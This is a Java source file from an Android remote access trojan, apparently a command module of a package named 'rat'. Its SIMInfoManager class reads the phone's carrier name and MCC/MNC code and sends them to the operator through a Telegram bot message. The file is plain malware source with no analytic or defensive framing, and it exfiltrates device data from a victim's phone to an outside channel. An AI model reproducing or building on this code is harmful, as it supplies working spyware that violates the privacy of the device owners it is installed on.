package com.enterprise.rat.commands;

import android.content.Context;
import android.telephony.TelephonyManager;
import com.enterprise.rat.utils.TelegramApi;

public class SIMInfoManager {
    private Context context;
    public SIMInfoManager(Context context) { this.context = context; }
    public void getSIMInfo() {
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        StringBuilder sb = new StringBuilder("<b>📱 SIM Info</b>\n\n");
        sb.append("<b>Carrier:</b> <code>").append(tm.getNetworkOperatorName()).append("</code>\n");
        sb.append("<b>MCC/MNC:</b> <code>").append(tm.getNetworkOperator()).append("</code>\n");
        TelegramApi.sendMessage(sb.toString());
    }
}
